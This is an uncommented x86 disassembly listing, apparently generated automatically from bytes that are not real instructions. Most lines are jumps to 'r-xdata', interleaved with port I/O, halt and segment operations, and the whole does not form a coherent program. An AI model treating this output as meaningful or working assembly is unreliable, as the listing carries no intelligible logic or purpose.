or bl [ edi - 0x16 ]
ficomp [ edi + 0x66ecffc7 ]
out 0xe3 al
jecxz r-xdata
jecxz r-xdata
mov ch 0xb4
or ecx [ ecx ]
out dx eax
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0xab2b20f
mov bl [ ebx ]
sbb al 0x1c
push 0xe3e3236d
jae r-xdata
ja r-xdata
mov eax ebp
mov ch 0xa
jae r-xdata
adc ecx [ edi + 0x1ce3d1d0 ]
cmpsb [ esi ] [ edi ]
jecxz r-xdata
push esp
pushad
or bl cl
in al 0xe3
jecxz r-xdata
jae r-xdata
cmp eax 0x731c1c1f
jecxz r-xdata
jae r-xdata
sub ch ah
arpl bx sp
jecxz r-xdata
jae r-xdata
jecxz r-xdata
lahf
in al dx
out 0xe3 al
jae r-xdata
jecxz r-xdata
and eax 0xe3f3c7a7
ficomp [ edi + 0x66ecd7c7 ]
out 0xe3 al
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
and esp [ edi - 0x1d ]
jecxz r-xdata
sbb al 0x1c
mov bl 0xa
scasd [ edi ]
sbb [ esp + ebx ] ebx
jae r-xdata
cmpsd [ esi ] [ edi ]
and esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
add esp ebx
jecxz r-xdata
inc esi
hlt
push 0x65
pop edi
jae r-xdata
mov al 0xa
or eax 0x73e3e3f4
or al [ edx ]
jmp ebx
cmp esp [ esi + 0x38 ]
or ch al
push ds
jecxz r-xdata
cdq
int 0xe3
jecxz r-xdata
call 0x73624036
sbb al 0xb4
mov edi 0xab3951c
cmp [ edx ] cl
jae r-xdata
push 0xe3e35f65
jecxz r-xdata
test [ eax + 0x1a ] esp
mov edi 0xe3ee9e0a
pushad
xchg [ ebx ] bl
jecxz r-xdata
or edx [ eax ]
jae r-xdata
and eax 0xe1f3c7a7
daa
push 0xfffffffb
loope r-xdata
jae r-xdata
mov ah [ ebx ]
jcxz r-xdata
jae r-xdata
jcxz r-xdata
or dh [ eax ]
int3
jae r-xdata
push 0xafbc7a7
pop eax
pop ds
sbb al 0x1c
jae r-xdata
jecxz r-xdata
mov esp [ ebx ]
push es
or esi [ edi - 0xc ]
jecxz r-xdata
in al dx
jecxz r-xdata
nop [ ebx + esi * 2 ] ebx
outsb
int3
mov ah 0xbf
sbb al 0x95
mov ecx [ ecx ]
bound ecx [ ecx ]
xor [ eax + 0x3b ] ch
cmp ah ch
pop ecx
mov al 0x6a
or [ edx + 0x9 ] esp
jae r-xdata
sbb eax 0xa6681c1c
or edx esi
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
push 0xffffffbe
mov bh 0x68
cmp al [ ebp + 0x68b5be6a ]
jae r-xdata
jae r-xdata
jae r-xdata
mov al 0x6a
jge r-xdata
pushad
daa
push 0x65
pop es
jecxz r-xdata
mov bl 0x1c
xchg esi eax
test [ edx ] 0xe3e3deee
enter 0xe3e3 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
mov al [ 0x236685a7 ]
jae r-xdata
jecxz r-xdata
in al dx
xor ch ah
xor ah cl
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
nop
cli
jecxz r-xdata
jecxz r-xdata
mov [ ebx + 0x3da66a85 ] edx
mov ebx 0x890acd89
pop ss
jae r-xdata
pushad
and ah cl
or ch [ 0x731c1c0f ]
jecxz r-xdata
mov ch 0xab
inc edi
jecxz r-xdata
and al 0xbc
mov esi 0x22687320
sub ah [ eax ]
sbb al 0x74
in al dx
test [ esi + 0x23 ] esp
jae r-xdata
mov ebx 0x67ec2366
xor ch ah
push 0xffffffa7
loope r-xdata
jae r-xdata
jae r-xdata
mov ebx [ edx + 0xa7720cd ]
into
xchg [ ebp - 0x22385896 ] al
mov ebx 0xe3c3c50a
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ss
mov bl 0x24
cmpsb [ esi ] [ edi ]
pop ss
xchg esi eax
nop
xchg [ ecx + 0x1ba62485 ] dl
rcl cl 0x1
and eax 0x1ce319a6
mov ecx esp
sbb al 0xb5
out dx eax
push 0x1c18603b
in al dx
aad 0xc5
jecxz r-xdata
jecxz r-xdata
mov al 0xa
sbb esi eax
jecxz r-xdata
push es
and ebp esp
jae r-xdata
jae r-xdata
jae r-xdata
mov bl 0x24
cmpsb [ esi ] [ edi ]
in al dx
sbb al 0x1c
jae r-xdata
push 0xffffffa6
cmp eax 0xacd89bb
mov [ edi ] edx
jae r-xdata
shl [ ebx ] 0x1
or bh [ 0x731c1c1f ]
push ds
sbb al 0x1c
or al [ ecx + 0x19 ]
sbb al 0x1c
and al 0xa6
pop ds
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ edx ]
out dx eax
jecxz r-xdata
adc eax 0x1c0e040a
sbb al 0x73
jae r-xdata
xchg [ ebx + 0x6a858f89 ] bh
jae r-xdata
jecxz r-xdata
push 0xa38663b
stosd [ edi ]
jecxz r-xdata
jecxz r-xdata
or ecx [ edx ]
or eax 0xaba1c1c
cmp ch ah
jecxz r-xdata
fsubrp st3
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
mov [ ebp + 0x13a66a85 ] eax
mov ebx 0xe3cc590a
in al dx
mov [ esi - 0x7a707645 ] eax
push 0xffffffa6
xor eax 0x17ae6a85
jae r-xdata
sbb al 0x89
jecxz r-xdata
int1
xlat
jecxz r-xdata
mov [ edi + 0x15a66a85 ] ecx
or al [ esi + ecx ]
jae r-xdata
push 0x202a1fa6
mov ch 0xb
pushfd
cmpsb [ esi ] [ edi ]
pop ds
sub ah [ eax ]
sbb al 0xb6
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
inc ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
fdiv st3
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
cmpsd [ esi ] [ edi ]
and bp sp
pop esp
sbb [ esp + ebx ] ebx
mov ebx esp
sbb al 0x75
dec edi
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0xa
scasb [ edi ]
hlt
jae r-xdata
or bl [ ecx ]
mov ebx eax
jecxz r-xdata
push es
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al [ esi - 0x76e3e3e2 ]
mov [ esi + 0x3fa66a85 ] ecx
or dl bh
jecxz r-xdata
xlat
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
test [ ebp - 0x44ec5996 ] eax
or bl [ ecx - 0x34 ]
jecxz r-xdata
sbb al 0x89
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
jecxz r-xdata
adc ch bh
cmpsb [ esi ] [ edi ]
jae r-xdata
and ebp [ edx ]
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
aas
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
sbb [ si ] bl
sbb al 0xa
out 0xc4 eax
jecxz r-xdata
outsb
jae r-xdata
jae r-xdata
jae r-xdata
das
jecxz r-xdata
jae r-xdata
popad
scasb [ edi ]
mul ebx
sbb al 0x1c
jae r-xdata
pop [ ebp + 0xa15a66a ]
add al 0xe
outsb
push ebx
push ds
sbb al 0x1c
or ebx [ 0x661c1c0e ]
and ebp esp
test ebp ebp
jecxz r-xdata
jae r-xdata
shr [ eax + 0x25 ] cl
jae r-xdata
jae r-xdata
jae r-xdata
push 0x8580893a
push 0xffffffbe
mov ebx eax
test [ edx - 0x52 ] ebp
jae r-xdata
sbb [ esp + ebx ] ebx
in al dx
inc eax
sbb ebx [ esp + ebx ]
or ch [ esi + 0x73e3e3f4 ]
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xeba6680f
or dh [ edi + 0x73e3e3d7 ]
jae r-xdata
or ah [ esi + eax * 8 + 0xf68e3e3 ]
or ah [ edx - 0x49e3e3eb ]
test [ edx - 0x42 ] ebp
seto [ ebx + 0x250a8f86 ]
sbb eax 0x93681c1c
fnstsw ax
adc ebp esp
push esp
movsd [ edi ] [ esi ]
test [ edx ] 0xe3e3e509
mov ebx 0x37a66a85
shl [ ebx ] 0x1
test [ edx - 0x4a ] ebp
sub eax 0x35a66a85
test [ edx - 0x52 ] ebp
pop ss
daa
fld [ esi - 0x5a ]
btr [ esi ] esp
push 0xffffffa7
out dx al
jecxz r-xdata
out dx al
jecxz r-xdata
and bp sp
0xb73e3e3 0xfb6a
jae r-xdata
cmpsb [ esi ] [ edi ]
push edx
jae r-xdata
and [ ebx + 0x73 ] dh
pushad
jae r-xdata
inc ecx
cmp [ ebp + 0x681dbe6a ] al
cmp [ ebp - 0x76bc4196 ] eax
nop
push 0xbe6a853a
mov [ eax - 0x1c0df2f6 ] edx
jecxz r-xdata
mov eax 0x6a859089
mov esi 0x6a85b84b
mov esi 0x893a6849
add [ ebp - 0x47b04196 ] 0x85
jae r-xdata
mov ebx 0x6a858f89
jae r-xdata
mov bl 0xa
xchg ebp eax
jecxz r-xdata
jecxz r-xdata
jae r-xdata
or edi [ esi ]
jae r-xdata
jecxz r-xdata
or dl [ edx - 0xe ]
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
retn
jae r-xdata
push 0xffffffbe
inc ebp
xor bx [ esi ]
sbb al 0x1c
or bl [ ebx - 0x2a ]
jecxz r-xdata
sbb al 0x1c
mov edx 0xe3ec3a0a
jecxz r-xdata
jae r-xdata
or ebx [ esi + ebx + 0x410a1c1c ]
sbb [ esp + ebx ] ebx
jecxz r-xdata
or ebp [ edx - 0x5 ]
jae r-xdata
or eax esp
fsub st3
jecxz r-xdata
bound ecx [ edi ]
dec edi
out 0xe3 eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
jae r-xdata
in al dx
or dh [ ebx + 0x731c1c0c ]
imul esi [ edi + 0x1a6027fe ] 0xffffffc3
or dh ch
popad
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
loope r-xdata
mov ebp ecx
or al [ eax + 0x731c1c11 ]
sti
jae r-xdata
xchg edi eax
retn
sbb esp edx
in al dx
dec eax
enter 0xe3e3 0xc2
mov edi 0xa76ef3c7
xor [ ecx ] cl
sbb al 0x1c
add eax ebp
push 0x18d60b25
sbb al 0x1c
mov ebp esp
mov ecx [ ebx ]
loopne r-xdata
jae r-xdata
jecxz r-xdata
cmp edi [ ebx + 0x6a858e89 ]
test [ edx - 0x5a ] ebp
push 0xef27603b
salc
pushad
jecxz r-xdata
add eax ebp
jae r-xdata
and al 0xa6
pushad
in al 0xe3
jecxz r-xdata
pushad
inc edi
mov eax 0x6a859789
mov esi 0x9089b845
mov esi 0x85396841
push 0xffffffbe
jae r-xdata
mov eax 0x4dbe6a85
mov [ eax + 0x4fbe6a85 ] eax
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov cl 0xa
mov [ ecx ] bl
or dh [ esp + ecx * 8 ]
jae r-xdata
cmp ah ch
pextrw esp mm3 0xe3
push 0x66f3c7af
sub ch ah
sbb al 0xa
inc edi
outsb
cmpsb [ esi ] [ edi ]
cmp esp esp
jecxz r-xdata
mov al 0x1c
jne r-xdata
nop [ edx + edi * 4 ] ebx
pushad
jae r-xdata
or ah [ eax + 0x73e3e3f7 ]
or ah cl
loop r-xdata
push 0xbe6a8539
outsb
dec edi
test [ edx - 0x42 ] ebp
jae r-xdata
mov edi esp
or al [ ecx + eax * 8 - 0x1d ]
jecxz r-xdata
or ch dh
fsubrp st3
jecxz r-xdata
jecxz r-xdata
inc ebx
jae r-xdata
jmp r-xdata
and eax 0x1c18d60b
cmovg esp edi
jecxz r-xdata
jae r-xdata
in eax 0x8b
or esp eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
sbb cl [ ebx - 0x3acb9e14 ]
jecxz r-xdata
mov bh 0xfe
daa
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
jae r-xdata
jecxz r-xdata
mov esi 0x6a85b84f
mov esi 0xa90894d
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
int 0xa
adc [ ecx ] 0x1c
sbb al 0x73
jae r-xdata
or [ edx ] 0x5a
retn
loope r-xdata
pushad
or dh [ eax ]
or [ esp + ebx ] ebx
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
jecxz r-xdata
mov dh 0xa
xor al 0xcc
jecxz r-xdata
jae r-xdata
sbb al 0xe0
in al dx
popad
sub esp esp
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cdq
push ebx
and eax [ esi ]
jae r-xdata
jae r-xdata
or edi [ edx + 0x19880ab1 ]
jecxz r-xdata
jae r-xdata
sbb al 0x1c
scasd [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
in al 0xe3
cmc
sub ah [ eax ]
jae r-xdata
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xbeba668 ]
nop [ edx + edi * 4 ] ebx
push 0xffffffbe
jae r-xdata
jae r-xdata
or cl [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
sbb al 0x68
cmp esp [ eax + 0x27 ]
out dx eax
sbb al 0xb5
jmp r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb esp edx
in al dx
in al 0xe3
jecxz r-xdata
retn 0xc7bf
dec ebp
jae r-xdata
enter 0xe3e3 0xe3
cmpsb [ esi ] [ edi ]
pop ds
sbb al bl
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ edx - 0x5a ] ebp
adc edi [ ebx - 0x1c33a6f6 ]
jae r-xdata
in al dx
call 0xb2a0bb6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
nop
or cl [ 0xffffffffbde3e3f2 ]
jae r-xdata
jae r-xdata
jae r-xdata
or dl [ ecx + 0x68e3e3d3 ]
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jecxz r-xdata
mov eax 0xa668202a
add al 0x1c
rcr [ edx + ecx ] 0x1
jae r-xdata
jae r-xdata
or eax 0xbde3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
shl ebx cl
jae r-xdata
mov esi 0x1a540b1f
jae r-xdata
and eax esi
jecxz r-xdata
call 0xb2a0bb6
adc [ esp + ebx ] bx
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
cdq
int 0xe3
jecxz r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah [ esi + 0x11 ]
jae r-xdata
aas
push 0x9e6a851a
pop ss
or cl [ edi + 0x241c1c09 ]
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
aaa
mov bl 0xa
mov bl 0xc
sbb al 0x1c
jae r-xdata
xchg [ edi ] bl
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
daa
out dx eax
or bl [ eax + 0x731c1c0f ]
jae r-xdata
or edx [ edx + ebx + 0x1c ]
jae r-xdata
jae r-xdata
out 0xe3 al
jae r-xdata
and al 0xa6
daa
mov ch 0xae
xchg esp eax
loopne r-xdata
and esp [ ebx + 0x7373202a ]
jae r-xdata
or bl [ ebx + 0x73e3e3e6 ]
sbb al 0xec
jae r-xdata
lahf
mov edi 0x1967ece3
and ecx esp
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
test [ edx - 0x42 ] ebp
dec ebx
mov eax 0x49be6a85
mov ebp 0x73737320
jae r-xdata
jae r-xdata
and ah ch
in al 0xe3
jecxz r-xdata
cmp al bl
adc [ edx ] cl
stosb [ edi ]
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
add eax 0x73e3e3c0
out 0xc6 al
sbb al 0xec
jae r-xdata
pushad
sbb bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
jae r-xdata
lodsb [ esi ]
jecxz r-xdata
jae r-xdata
adc al 0xa
movsd [ edi ] [ esi ]
adc [ esp + ebx ] bl
or bl [ ecx ]
jpo r-xdata
jae r-xdata
loop r-xdata
pushad
in al dx
jae r-xdata
pushad
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al [ ebp + 0xa179e6a ]
jecxz r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
push ebx
mov bl 0x6e
xchg [ esp + ebx ] bx
sbb al 0xb3
or al [ 0x73e3e3c0 ]
loop r-xdata
mov al 0xb3
pop ds
sbb al 0x1c
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x60
jmp r-xdata
mov ebp 0x68202ab8
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jecxz r-xdata
mov dh 0x68
punpckldq mmx1 [ edi ]
test [ edx - 0x5a ] ebp
jecxz r-xdata
out 0xc6 al
jae r-xdata
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
fwait
in al dx
sbb edi eax
jecxz r-xdata
pop ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x74
jae r-xdata
xor [ ebx + 0xabacd89 ] edi
push 0xa66a8521
jae r-xdata
or bh dl
push 0xffffffbe
inc ebx
or dh bh
or [ esp + ebx ] bl
jae r-xdata
outsd
push ds
sbb al 0x1c
test [ edx - 0x62 ] ebp
jne r-xdata
mov al 0xb5
mov ah 0x89
xchg ebx eax
mov esp 0x24689189
test [ edx - 0x5a ] ebp
popad
adc edi edi
jecxz r-xdata
sbb al 0x73
in al dx
in ax 0xe3
jecxz r-xdata
and [ ebp - 0x44ce5996 ] eax
mov ebp ecx
mov edx 0x1c04ac0a
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg ecx eax
in al dx
shl bl 0xe3
jae r-xdata
mov ebp [ edx - 0x4b82cf98 ]
push 0xffffffa5
or ebp esi
int1
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
jae r-xdata
sbb al 0x54
jecxz r-xdata
outsb
pop edi
outsd
bound ecx [ edi ]
mov bl 0xb5
or esp ecx
and bp sp
pop esi
jae r-xdata
daa
jecxz r-xdata
push esp
jae r-xdata
push 0xffffffa7
jae r-xdata
push 0xffffffa7
pushad
xchg edi eax
or cl [ ebx - 0x3 ]
jecxz r-xdata
push ebp
mov al [ 0x650ab3db ]
jecxz r-xdata
jecxz r-xdata
mov al 0x1c
xchg edi eax
jecxz r-xdata
sub ah [ eax ]
sbb al 0x96
jae r-xdata
mov bl 0xd0
adc eax 0xe3cdaa0a
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb eax 0x1c1f730a
sbb al 0x73
jae r-xdata
shl [ ebx ] 0x1
mov [ 0xffffffffe3f8fa0a ] eax
jecxz r-xdata
and edi [ ebp - 0x1c186ff6 ]
jecxz r-xdata
jae r-xdata
and edx [ ebx + edi ]
sub ah [ eax ]
jecxz r-xdata
push 0xffffffbe
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push esp
and ebp esp
jae r-xdata
or edi eax
int1
jecxz r-xdata
or bl [ ebx + 0x8 ]
sbb al 0x1c
jae r-xdata
loope r-xdata
push 0xe2f3c7a7
cmpsd [ esi ] [ edi ]
sbb al 0x60
jae r-xdata
jecxz r-xdata
pop ds
jae r-xdata
je r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x1c0f790a
or dh [ ebp + 0x14 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov ebp 0xe3e7900a
jae r-xdata
int3
cli
pop ds
jae r-xdata
jecxz r-xdata
xchg [ edi - 0x59db3271 ] ecx
pop ds
xchg [ edi - 0x4ce31c71 ] ecx
fwait
adc al 0x3b
clc
push 0xeb0f620f
loope r-xdata
test [ edx - 0x5a ] ebp
sbb al 0xa
jae r-xdata
and ebp esp
pop ss
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
push ebx
xor ah dh
jecxz r-xdata
mov ebx esp
sbb al 0x75
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
xchg ebp eax
sbb esp [ ebx - 0x1c149e14 ]
jecxz r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or ebp [ ebx ]
sbb [ esp + ebx ] bl
pushad
push 0xffffffa6
mov dh 0xa
fsincos
jecxz r-xdata
xchg ebp eax
xchg esi eax
jae r-xdata
jecxz r-xdata

jecxz r-xdata
or edi ebp
jae r-xdata
jne r-xdata
jne r-xdata
jmp r-xdata
or al 0x1c
jae r-xdata
jecxz r-xdata
sbb [ edx ] ecx
push 0xffffffa6
push esp
jae r-xdata
idiv [ ebx - 0x1c0455f6 ]
jecxz r-xdata
mov ch 0xb4
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl esp cl
jae r-xdata
jmp 0x2daf0c7c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub cl [ edx ]
mov esp ss
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov ch 0xb4
mov [ edx + 0xa9589b9 ] eax
fiadd [ esi ]
mov eax 0x961c202a
or cl [ ebx + 0x731c1c0c ]
mov ebx 0x1c18b40a
sbb al 0x73
sbb al 0x75
dec edi
sub ah [ eax ]
jae r-xdata
xchg ebp eax
and edi [ edx + 0x1bbe6aba ]
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov ah 0x89
cmp [ ecx - 0x25f56a77 ] 0x6
sbb eax 0xe3d3a50a
test [ ebp - 0x44e45996 ] eax
mov ebp ecx
test [ edx - 0x5a ] ebp
sbb [ ebx + 0x1fa66a85 ] edi
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
mov [ ebx + 0x689189bc ] edx
and al 0x85
push 0xffffffa6
sbb bx [ esi ]
sbb al 0x1c
or ch [ edi ]
or al 0x1c
or bh [ ecx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
or [ esp + ebx ] bl
adc ax 0x770a
out dx al
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
xchg esi eax
outsb
adc ebx [ esp + ebx ]
jae r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or edi edx
push ds
in eax dx
cmc
jecxz r-xdata
jae r-xdata
or dl [ ebx ]
nop [ ebx + esi * 2 ] ebx
jae r-xdata
pop es
sbb al 0x96
mov bl 0xb0
or bh [ ebx + ecx * 8 + 0x7373e3e3 ]
test [ edx - 0x42 ] ebp
sbb al 0x95
in al dx
or esi [ edi ]
jae r-xdata
sbb al 0x96
and al 0xa6
jae r-xdata
jae r-xdata
jae r-xdata
pop edi
jae r-xdata
mov dh 0x68
test [ esi + 0x15 ] esp
or dh [ edi - 0x12 ]
jecxz r-xdata
rcl [ 0xffffffffe3cdaa0a ] 0x1
outsb
mov bh 0xa
stosb [ edi ]
jecxz r-xdata
sbb al 0x95
mov bl 0x1c
nop [ ebx + esi * 2 ] ebx
jae r-xdata
xchg ecx eax
jae r-xdata
jae r-xdata
sti
sbb al 0xb5
xchg edi eax
or bl [ esi ]
loope r-xdata
jae r-xdata
enter 0xe3e3 0x73
cmpsb [ esi ] [ edi ]
aas
mov [ eax - 0x59db7a74 ] ss
add edx [ edi + 0x2495abc3 ]
cmpsb [ esi ] [ edi ]
cmp dl [ 0xffffffffb8bc1c1c ]
jae r-xdata
jecxz r-xdata
mov ebp [ eax + ecx ]
or eax [ esi ]
in al dx
jecxz r-xdata
or bl bl
or eax 0xbfa56ab4
or dh [ ebp + 0x17 ]
in al dx
jecxz r-xdata
jae r-xdata
or bl dl
push es
push 0xef0f600f
and ecx [ ebp + 0xaaeaeb5 ]
xchg ecx eax
jae r-xdata
or bh [ edx ]
adc eax 0xb8bc1c1c
cmpsb [ esi ] [ edi ]
jmp r-xdata
popad
jmp r-xdata
jecxz r-xdata
dec edi
daa
or dh bh
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x97
jecxz r-xdata
daa
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
push ds
sbb al 0x1c
or dl bl
hlt
retn
jae r-xdata
jae r-xdata
or cl [ ecx ]
sbb [ esp + ebx ] bl
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6f656ab4
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
dec edx
adc [ esp + ebx ] bl
jae r-xdata
push 0xffffffa5
mov ebx 0xe3ec100b
jecxz r-xdata
jae r-xdata
mov ch 0xae
scasb [ edi ]
or dl [ ecx + 0x73e3e3c8 ]
bound ecx [ edi ]
shl ecx cl
mov ah 0x18
and [ ebx + 0x73 ] dh
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
test [ edx - 0x4a ] ebp
iretd
and al 0xa
aas
leave
jecxz r-xdata
sar [ eax ] 0x1
fcom [ eax ]
or ch [ edx + 0x731c1c0a ]
outsb
cmpsd [ esi ] [ edi ]
sbb al 0x97
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
jecxz r-xdata
adc ah ch
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and eax [ ebp + 0xa1da66a ]
movsd [ edi ] [ esi ]
shl ebx cl
fisttp [ 0xffffffffbfa56ab4 ]
sub al 0x8
sbb al 0x1c
push 0xe3e35f65
or dh [ ecx + 0x73e3e3e7 ]
jae r-xdata
jae r-xdata
pop ss
push 0x961ceba6
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
or cl bl
outsb
sub ebx [ esi ]
sbb al 0x1c
or ebx [ edx ]
mov esp 0x85b98f89
push 0xffffffb6
int 0x85
push 0xffffffb6
ror [ edx ] cl
mov bh 0x8
sbb al 0x1c
jae r-xdata
or bh [ ebx ]
out 0xe3 eax
jecxz r-xdata
pushad
daa
aaa
or edi edi
sbb [ esp + ebx ] bl
mov edx 0x1c13f40a
pushad
xchg edi eax
sbb al 0x1c
or al [ ebp + 0x1e ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
mov bl 0xa
or [ eax ] ebx
sbb al 0x1c
pxor mm5 [ esi - 0x5a ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
enter 0xe3e3 0x73
jae r-xdata
jecxz r-xdata
pushad
jae r-xdata
jae r-xdata
jae r-xdata
push ds
jecxz r-xdata
int1
jae r-xdata
jae r-xdata
les cx [ eax ]
sbb al 0x1c
or esi [ edx - 0xb ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
mov ecx [ esp + ebx ]
lea esi [ ebp - 0x6ef55152 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0x85
push 0xe085e1a4
cmpsd [ esi ] [ edi ]
imul esp ebx 0xffffffe2
jecxz r-xdata
out dx eax
or bl [ edi ]
hlt
sbb al 0x75
dec edi
aas
mov ebx 0x1c14a00a
mov al 0x1c
jne r-xdata
in al 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
or al cl
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
xchg [ esp + ebx ] bx
jae r-xdata
push esp
jae r-xdata
jae r-xdata
jae r-xdata
pop ebx
mov ebx 0x24b58d86
jecxz r-xdata
psrlq mm4 mmx1
mul bl
shl [ ebx ] 0x1
mov edx 0x1bbe6aba
sbb al 0x1c
jae r-xdata
push 0x14750a0f
clc
jecxz r-xdata
jae r-xdata
or bl [ esi ]
cld
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
outsb
jae r-xdata
pushad
cmpsb [ esi ] [ edi ]
sbb ecx ebx
fisub [ esi - 0x549e13e9 ]
int 0xe3
jecxz r-xdata
jecxz r-xdata
and bp sp
jae r-xdata
adc al 0x1c
or esi ecx
jae r-xdata
lfs ecx [ ecx - 0x2c1c7419 ]
mov esp ebx
shl ebx cl
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
scasb [ edi ]
mov ebx 0x23a62486
mov ch 0x24
xchg esi eax
or cl [ ecx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and cx [ edx ]
sbb al 0x1c
pushad
jae r-xdata
or ah [ edx + 0x1a ]
sbb al 0x1c
mov [ 0x1fa6e01b ] eax
test [ edx - 0x5a ] ebp
xor eax 0x859089bb
push 0xffffffa6
cmp edi [ ebx + 0x6a858089 ]
cmpsb [ esi ] [ edi ]
cmp [ eax + 0x22 ] ebp
test [ edx - 0x5a ] ebp
